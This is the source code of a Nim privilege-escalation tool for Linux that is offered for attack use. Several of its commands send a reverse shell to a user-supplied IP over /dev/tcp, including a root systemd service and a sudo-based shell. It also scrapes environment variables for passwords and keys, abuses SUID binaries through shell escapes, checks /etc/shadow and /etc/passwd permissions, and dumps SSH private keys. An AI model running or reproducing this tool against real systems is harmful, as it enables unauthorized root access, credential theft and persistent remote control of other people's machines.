import strformat, os, strutils, osproc

let red = "\e[31m"
let yellow = "\e[33m"
let cyan = "\e[36m"
let green = "\e[32m"
let blue = "\e[34m"
let def = "\e[0m"

var vulnerable = false

let banner = &"""
{blue}
              __      _           _               
 _   ____  __/ /___  (_)___ ___  (_)_______  _____
| | / / / / / / __ \/ / __ `__ \/ / ___/ _ \/ ___/
| |/ / /_/ / / / / / / / / / / / (__  )  __/ /    
|___/\__,_/_/_/ /_/_/_/ /_/ /_/_/____/\___/_/     
                            {green}By 0x454d505459#5042{def}
{def}
"""

type EKeyboardInterrupt = object of CatchableError

proc handler() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")

setControlCHook(handler)

proc read(args: string): string =
  stdout.write(args)
  result = stdin.readline()


proc isnext() =
    let next = read(&"Do you want to try the {blue}next{def} exploits ({green}y{def}/{red}n{def}) ? > ")
    if next == "n":
        echo &"\n{def}Bye ;)"
        quit()
try:
    echo banner
    echo ""
    echo &"Please open a {red}new{def} netcat listener on {cyan}port 5645{def}"
    let ip = read(&"Please enter {red}your{def} IP address > ")

    let me = execCmdEx("whoami")
    if me[0].strip() == "root":
        echo &"{green}LMAO, I got ran with root perms lol; here is a bash shell for you ;){def}"
        discard os.execShellCmd(&"bash -c 'exec bash -i &>/dev/tcp/{ip}/5645 <&1'")
        quit()

    let esca = &"""
    [Unit]
    Description=root

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ip}/5645 0>&1'

    [Install]
    WantedBy=multi-user.target


    """

    var passw = ""
    var passw_knowed = false


    let isknow = read(&"Do you know the current users's {blue}password{def}? (y/n) > ")
    if isknow == "y":
        passw = read(&"Pease input the {blue}password{def} > ")
        passw_knowed = true
        echo &"Saved password as {red}{passw}{def}"

    echo ""
    echo red, "!!! LET THE HACK BEGIN !!!", def
    echo ""

    let paths_cmd = execCmdEx("env || set 2> /dev/null")
    let paths_lines = paths_cmd[0].splitLines()
    for line in paths_lines:
        if "password" in line.toLowerAscii():
            let passwd = line.split('=')
            echo &"{green}INFO{def}: found password \"{green}{passwd}{def}\" in system env variables"
            passw = passwd[1]
        elif "key" in line.toLowerAscii():
            let key = line.split('=')
            echo &"{green}INFO{def}: found key \"{green}{key}{def}\" in system env variables"
        
    if passw_knowed:
        let cmd = execCmdEx(&"echo {passw} | sudo -S -l")
        let whoami = execCmdEx(&"whoami")
        if "ALL" in cmd[0]:
            echo &"{whoami[0].strip()} has {green}ALL{def} permission, sending back root shell to {ip}:5645..."
            discard os.execShellCmd(&"echo {passw} | sudo -S bash -c 'exec bash -i &>/dev/tcp/{ip}/5645 <&1'")
        else:
            echo &"Here's what this user({whoami[0].strip()}) can use:"
            echo cmd[0]

    echo &"{blue}Looking{def} for {red}SUID{def} permission"
    let suids = execCmdEx("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null")
    let lines = suids[0].split("\n")
    for line in lines:
        try:
            let path = line.split(' ')[8]

            if "python" in line:
                echo &"{green}FOUND{def} {red}python{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -c 'import os; os.execl("/bin/sh", "sh", "-p")'""")
                vulnerable = true
                
            if "systemctl" in line:
                echo &"{green}FOUND{def} {red}systemctl{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                writeFile("esca.service", esca)
                discard os.execShellCmd(&"{path} link esca.service && systemctl enable --now esca.service")
                vulnerable = true

            if "env" in line:
                echo &"{green}FOUND{def} {red}env{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} /bin/sh -p")
                vulnerable = true

            if "bash" in line:
                echo &"{green}FOUND{def} {red}bash{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard execCmdEx(&"{path} -c 'exec ./bash -p -i &>/dev/tcp/127.0.0.1/5645 <&1'")
                vulnerable = true

            if "chroot" in line:
                echo &"{green}FOUND{def} {red}chroot{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} / /bin/sh -p")
                vulnerable = true

            if "emacs" in line:
                echo &"{green}FOUND{def} {red}emacs{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -Q -nw --eval '(term "/bin/sh -p")'""")
                vulnerable = true

            if "make" in line:
                echo &"{green}FOUND{def} {red}make{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd("COMMAND='/bin/sh -p'")
                discard os.execShellCmd(&"{path} -s --eval=$\'x:\n\t-\'\"$COMMAND")
                vulnerable = true

            if "perl" in line:
                echo &"{green}FOUND{def} {red}perl{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -e 'exec "/bin/sh";'""")
                vulnerable = true

            if "vim" in line:
                echo &"{green}FOUND{def} {red}vim{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""")
                vulnerable = true
                
            if "zsh" in line:
                echo &"{green}FOUND{def} {red}zsh{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(path)
                vulnerable = true

            if "time" in line:
                echo &"{green}FOUND{def} {red}time{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"{path} /bin/sh -p")
                vulnerable = true

            if "gimp" in line:
                echo &"{green}FOUND{def} {red}time{def} to be vulnerable"
                echo &"{yellow}INFORMATION:{def} If the current exploit doesn't give back a root shell exit to try the next one"
                discard os.execShellCmd(&"""{path} -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'""")
                vulnerable = true

        except:
            discard
    
    if not vulnerable:
        echo &"{red}No SUID{def} executable found"

    isnext()
    
    echo ""
    echo &"{blue}Looking{def} for {red}READ{def} permission {blue}/etc/shadow{def}"
    let perms = os.getFilePermissions("/etc/shadow")
    if os.fpOthersRead in perms:
        echo &"{blue}/etc/shadow{def} is {green}readable{def}"
    else:
        echo &"{blue}/etc/shadow{def} is {red}not readable{def}"
    
    echo &"{blue}Looking{def} for {red}WRITE{def} permission {blue}/etc/shadow{def}"
    if os.fpOthersWrite in perms:
        echo &"{blue}/etc/shadow{def} is {green}writeable{def}"
    else:
        echo &"{blue}/etc/shadow{def} is not {red}writeable{def}"


    echo ""
    echo &"{blue}Looking{def} for {red}WRITE{def} permission {blue}/etc/passwd{def}"
    let passw_perms = os.getFilePermissions("/etc/passwd")
    if os.fpOthersWrite in passw_perms:
        echo &"{blue}/etc/passwd{def} is {green}writeable{def}"
    else:
        echo &"{blue}/etc/passwd{def} is not {red}writeable{def}"
    
    isnext()

    echo &"{blue}Looking{def} for ssh {red}private keys{def} in /.ssh"
    if os.dirExists("/.ssh/"):
        let content = execCmdEx("cat /.ssh/*id_rsa*")
        if content[0] == "":
            echo &"{red}NOT KEYS{def} has been found in /.ssh"
        echo content[0]
    else:
        echo &"{red}NOT SSH directory{def} has been found in /"

    echo &"{yellow}INFORMATION{def}: No other exploits available, exiting..."

except EKeyboardInterrupt:
    echo &"\n{def}Bye ;)"
    quit()
